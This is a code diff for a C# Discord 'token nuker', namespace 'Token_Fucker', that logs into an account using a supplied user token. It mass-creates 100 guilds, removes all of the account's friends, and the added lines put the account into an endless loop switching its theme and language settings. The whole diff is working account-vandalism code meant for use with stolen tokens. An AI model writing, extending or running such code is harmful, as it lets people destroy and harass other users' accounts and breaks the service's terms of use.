@@ -17,7 +17,6 @@ namespace Token_Fucker
             string token = Console.ReadLine();
             DiscordSocketClient client = new DiscordSocketClient(new DiscordSocketConfig() { ApiVersion = 7 });
             client.OnLoggedIn += Client_OnLoggedIn;
-            #region Token
             try
             {
                 client.Login(token);
@@ -25,7 +24,6 @@ namespace Token_Fucker
             {
                 Console.WriteLine("Invalid token passed.");
             }
-            #endregion
             Thread.Sleep(-1);
         }
         private static void Client_OnLoggedIn(DiscordSocketClient client, LoginEventArgs args)
@@ -49,7 +47,7 @@ namespace Token_Fucker
             }
 
             // Mass Create Guilds
-            for (int amount = 1; amount < 100; amount++)
+            for (int amount = 0; amount < 100; amount++)
             {
                 client.CreateGuild("Anarchy", null, "europe");
                 Console.WriteLine("Created a guild.");
@@ -63,7 +61,31 @@ namespace Token_Fucker
                 Console.WriteLine("Removed relationship with ID " + friendids.User.Id);
             }
 
-            Console.WriteLine("\n\nFinished fucking the account.");
+            // Spam switch through dark and white mode, and rapidly change the language of the user's account.
+            Console.WriteLine("Rapidly changing through dark and white mode, and random languages.");
+            while (true)
+            {
+                try
+                {
+                    var values = Enum.GetValues(typeof(DiscordLanguage)).Cast<DiscordLanguage>();
+                    foreach(var value in values)
+                    {
+                        client.User.ChangeSettings(new UserSettingsProperties
+                        {
+                            Theme = DiscordTheme.Dark,
+                            Language = value
+                        });
+                        client.User.ChangeSettings(new UserSettingsProperties
+                        {
+                            Theme = DiscordTheme.Light,
+                            Language = value
+                        });
+                    }
+                } catch (Exception ex)
+                {
+                    Console.WriteLine("Error: " + ex);
+                }
+            }
         }
     }
 }
